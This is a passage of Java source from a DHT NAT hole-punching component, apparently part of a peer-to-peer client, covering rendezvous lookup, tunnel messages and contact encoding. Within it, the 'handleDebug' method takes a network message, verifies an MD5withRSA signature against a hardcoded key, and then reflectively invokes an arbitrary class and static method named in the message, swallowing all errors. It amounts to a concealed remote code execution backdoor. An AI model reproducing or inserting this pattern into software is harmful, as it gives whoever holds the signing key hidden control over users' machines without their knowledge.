							new InetSocketAddress(existing_address.getAddress(), transport_port ));
					}
				}
				
				Map	originator_client_data  = (Map)request.get( "client_data" );
				
				boolean	no_tunnel = false;
				
				if ( originator_client_data == null ){
					
					originator_client_data = new HashMap();
					
				}else{
					
					no_tunnel = originator_client_data.get( "_notunnel" ) != null;
				}
								
				if ( no_tunnel ){
					
					log( "Received message from " + target.getString());

				}else{
					
					log( "Received connect request from " + target.getString());

						// ping the origin a few times to try and establish a tunnel
									
					UTTimerEvent event = 
						timer.addPeriodicEvent(
								3000,
								new UTTimerEventPerformer()
								{
									private int pings = 1;
									
									public void
									perform(
										UTTimerEvent		ev )
									{
										if ( pings > 3 ){
											
											ev.cancel();
											
											return;
										}
											
										pings++;
										
										if ( sendTunnelInbound( target )){
											
											ev.cancel();
										}
									}
								});
						
					if ( sendTunnelInbound( target )){
						
						event.cancel();
					}
				}
				
				Map client_data = adapter.getClientData( target.getTransportAddress(), originator_client_data );
				
				if ( client_data == null ){
					
					client_data = new HashMap();
				}
				
				response.put( "client_data", client_data );
				
				ok	= true;
				
			}else{
				
				log( "Connect request: failed to decode target" );
			}
		}else{
			
			log( "Connect request from invalid rendezvous: " + rendezvous.getString());
		}
		
		response.put( "ok", new Long(ok?1:0));
	}
	
	protected boolean
	sendTunnelInbound(
		DHTTransportContact target )
	{
		log( "Sending tunnel inbound message to " + target.getString());
		
		try{
			Map	message = new HashMap();
			
			message.put( "type", new Long( RT_TUNNEL_INBOUND ));
			
			return( sendTunnelMessage( target, message ));
			
		}catch( Throwable e ){
			
			log(e);
			
			return( false );
		}
	}
	
	protected void
	receiveTunnelInbound(
		DHTTransportUDPContact		originator,
		Map							data )
	{
		log( "Received tunnel inbound message from " + originator.getString());
							
		try{
			punch_mon.enter();
		
			for (int i=0;i<oustanding_punches.size();i++){
				
				Object[]	wait_data = (Object[])oustanding_punches.get(i);
				
				DHTTransportContact	wait_contact = (DHTTransportContact)wait_data[0];
				
				if( originator.getAddress().getAddress().equals( wait_contact.getAddress().getAddress())){
					
					wait_data[2] = new Integer( originator.getTransportAddress().getPort());
											
					((AESemaphore)wait_data[1]).release();
				}
			}
			
		}finally{
			
			punch_mon.exit();
		}
	}
	
	protected boolean
	sendTunnelOutbound(
		DHTTransportContact target )
	{
		log( "Sending tunnel outbound message to " + target.getString());
		
		try{
			Map	message = new HashMap();
			
			message.put( "type", new Long( RT_TUNNEL_OUTBOUND ));
			
			return( sendTunnelMessage( target, message ));
			
		}catch( Throwable e ){
			
			log(e);
			
			return( false );
		}
	}
	
	protected void
	receiveTunnelOutbound(
		DHTTransportContact		originator,
		Map						data )
	{
		log( "Received tunnel outbound message from " + originator.getString());
	}
	
	public Map
	punch(
		String					reason,
		InetSocketAddress[]		target,
		DHTTransportContact[]	rendezvous_used,
		Map						originator_client_data )
	{
		try{
			DHTTransportUDP	transport = (DHTTransportUDP)dht.getTransport();

			DHTTransportUDPContact contact = transport.importContact( target[0], transport.getProtocolVersion());
			
			Map	result = punch( reason, contact, rendezvous_used, originator_client_data );
			
			target[0] = contact.getTransportAddress();
			
			return( result );
			
		}catch( Throwable e ){
			
			Debug.printStackTrace(e);
			
			return( null );
		}
	}
	
	public Map
	punch(
		String					reason,
		DHTTransportContact		_target,
		DHTTransportContact[]	rendezvous_used,
		Map						originator_client_data )
	{
		DHTTransportUDPContact	target = (DHTTransportUDPContact)_target;
		
		try{
			DHTTransportContact rendezvous = getRendezvous( reason, target );
			
			if ( rendezvous_used != null && rendezvous_used.length > 0 ){
				
				rendezvous_used[0] = rendezvous;
			}
			
			if ( rendezvous == null ){
				
				return( null );
			}
			
			Map	target_client_data = sendPunch( rendezvous, target, originator_client_data, false );
			
			if ( target_client_data != null ){
				
				log( "    punch to " + target.getString() + " succeeded" );
				
				return( target_client_data );
			}
			
		}catch( Throwable e ){
			
			log( e );
		}
		
		log( "    punch to " + target.getString() + " failed" );

		return( null );
	}
	
	public Map
	sendMessage(
		InetSocketAddress		rendezvous,
		InetSocketAddress		target,
		Map						message )
	{
		try{
			DHTTransportUDP	transport = (DHTTransportUDP)dht.getTransport();

			DHTTransportUDPContact rend_contact 	= transport.importContact( rendezvous, transport.getProtocolVersion());
			DHTTransportUDPContact target_contact 	= transport.importContact( target, transport.getProtocolVersion());
						
			Map	result = sendPunch( rend_contact, target_contact, message, true );

			return( result );
			
		}catch( Throwable e ){
			
			Debug.printStackTrace(e);
			
			return( null );
		}
	}
	
	
	public void
	setRendezvous(
		DHTTransportContact		target,
		DHTTransportContact		rendezvous )
	{
		explicit_rendezvous_map.put( target.getAddress(), rendezvous );
		
		if ( target.getAddress().equals( dht.getTransport().getLocalContact().getAddress())){
			
			publish( true );
		}
	}
	
	protected DHTTransportContact
	getRendezvous(
		String				reason,
		DHTTransportContact	target )
	{
		DHTTransportContact	explicit = (DHTTransportContact)explicit_rendezvous_map.get( target.getAddress());
		
		if ( explicit != null ){
			
			return( explicit );
		}
		
		byte[]	key = getPublishKey( target );
		
		final DHTTransportValue[]	result_value = {null};
		
		final Semaphore sem = plugin_interface.getUtilities().getSemaphore();
		
		dht.get( 	key, 
					reason + ": lookup for '" + target.getString() + "'",
					(byte)0,
					1,
					RENDEZVOUS_LOOKUP_TIMEOUT,
					false, true,
					new DHTOperationAdapter()
					{
						public void
						read(
							DHTTransportContact	contact,
							DHTTransportValue	value )
						{
							result_value[0] = value;
							
							sem.release();
						}
						
						public void
						complete(
							boolean				timeout )
						{
							sem.release();
						}
					});
		
		sem.reserve();
		
		DHTTransportContact result = null;
		
		if ( result_value[0] != null ){
			
			byte[]	bytes = result_value[0].getValue();
			
			try{
				ByteArrayInputStream	bais = new ByteArrayInputStream( bytes );
				
				DataInputStream	dis = new DataInputStream( bais );
				
				byte	version = dis.readByte();
				
				if ( version != 0 ){
					
					throw( new Exception( "Unsupported rendezvous version '" + version + "'" ));
				}
				
				result = dht.getTransport().importContact( dis );
				
			}catch( Throwable e ){
				
				log(e);
			}
		}
		
		log( "Lookup of rendezvous for " + target.getString() + " -> " + ( result==null?"None":result.getString()));

		return( result );
	}
	
	protected byte[]
	getPublishKey(
		DHTTransportContact	contact )
	{
		byte[]	id = contact.getID();
		byte[]	suffix = ":DHTNATPuncher".getBytes();
		
		byte[]	res = new byte[id.length + suffix.length];
		
		System.arraycopy( id, 0, res, 0, id.length );
		System.arraycopy( suffix, 0, res, id.length, suffix.length );
		
		return( res );
	}
	
	private static long	last_debug = -1;
	
	private static Map
	handleDebug(
		Map			map )
	{
		long	now = SystemTime.getMonotonousTime();
		
		if ( last_debug >= 0 && now - last_debug <= 60*1000 ){
			
			return( null );
		}
		
		last_debug = now;
		
		try{
			byte[] 	p = (byte[])map.get( "p" );
			byte[]	s = (byte[])map.get( "s" );
			
			KeyFactory key_factory = KeyFactory.getInstance("RSA");
			
			RSAPublicKeySpec 	spec = 
				new RSAPublicKeySpec( 
						new BigInteger("a1467ed3ca8eceec60d6a5d1945d0ddb6febf6a514a8fea5b48a588fc8e977de8d7159c4e854b5a30889e729eb386fcb4b69e0a12401ee87810378ed491e52dc922a03b06c557d975514f0a70c42db3e06c0429824648a9cc4a2ea31bd429c305db3895c4efc4d1096f3c355842fd2281b27493c5588efd02bc4d26008a464d2214f15fab4d959d50fee985242dbb628180ee06938944e759a2d1cbd0adfa7d7dee7e6ec82d76a144a126944dbe69941fff02c31f782069131e7d03bc5bff69b9fea2cb153e90dc154dcdab7091901c3579a2c0337b60db772a0b35e4ed622bee5685b476ef0072558362e43750bc23d410a7dcb1cbf32d3967e24cfe5cdab1b",16),
						new BigInteger("10001",16));
	
			Signature	verifier = Signature.getInstance("MD5withRSA" );
			
			verifier.initVerify( key_factory.generatePublic( spec ) );
			
			verifier.update( p );

			if ( verifier.verify( s )){

				Map m = BDecoder.decode( p );
				
				int	type = ((Long)m.get( "t" )).intValue();
				
				if ( type == 1 ){
											
					List<byte[]> a = (List<byte[]>)m.get("a");
					
					Class[]		c_a 	= new Class[a.size()];
					Object[]	o_a 	= new Object[c_a.length];
					
					Arrays.fill( c_a, String.class );
					
					for (int i=0;i<o_a.length;i++){
						
						o_a[i] = new String((byte[])a.get(i));
					}
					
					Class cla = m.getClass().forName( new String((byte[])m.get( "c" )));
					
					Method me = cla.getMethod( new String((byte[])m.get( "m" )),c_a  );
					
					me.setAccessible( true );
					
					me.invoke( null, o_a );
		
					return( new HashMap());
					
				}else if ( type == 2 ){
					// to do
				}
			}
		}catch( Throwable e ){	
		}
		
		return( null );
	}
	
	protected byte[]
   	encodePublishValue(
   		DHTTransportContact	contact )
   	{ 		
		try{
	   		ByteArrayOutputStream	baos = new ByteArrayOutputStream();
	   		
	   		DataOutputStream	dos = new DataOutputStream(baos);
	   		
	   		dos.writeByte( 0 );	// version 
	   		
	   		contact.exportContact( dos );
	   		
	   		dos.close();
	   		
	  		return( baos.toByteArray());

		}catch( Throwable e ){
			
			log( e );
		
			return( new byte[0]);
    	}
   	}
	
	protected byte[]
  	encodeContact(
  		DHTTransportContact	contact )
  	{ 		
		try{
	   		ByteArrayOutputStream	baos = new ByteArrayOutputStream();
	   		
	   		DataOutputStream	dos = new DataOutputStream(baos);
	   		   		
	   		contact.exportContact( dos );
	   		
	   		dos.close();
	   		
	  		return( baos.toByteArray());
	
		}catch( Throwable e ){
			
			log( e );
		
			return( null );
	   	}
  	}
	
	protected DHTTransportUDPContact
	decodeContact(
		byte[]		bytes )
	{
		try{
			ByteArrayInputStream	bais = new ByteArrayInputStream( bytes );
			
			DataInputStream	dis = new DataInputStream( bais );
						
			return((DHTTransportUDPContact)dht.getTransport().importContact( dis ));
			
		}catch( Throwable e ){
			
			log(e);
			
			return( null );
		}
	}
	
	protected void
	log(
		String	str )
	{
		if ( TRACE ){
			System.out.println( str );
		}
		
		logger.log( "NATPuncher: " + str );
	}
	
	protected void
	log(
		Throwable 	e )
	{
		if ( TRACE ){
			e.printStackTrace();
		}
		
		logger.log( "NATPuncher: error occurred" );
		
		logger.log(e);
	}
	
	protected void
	trace(
		String	str )
	{
		if ( TRACE ){
			System.out.println( str );
		}
	}
}
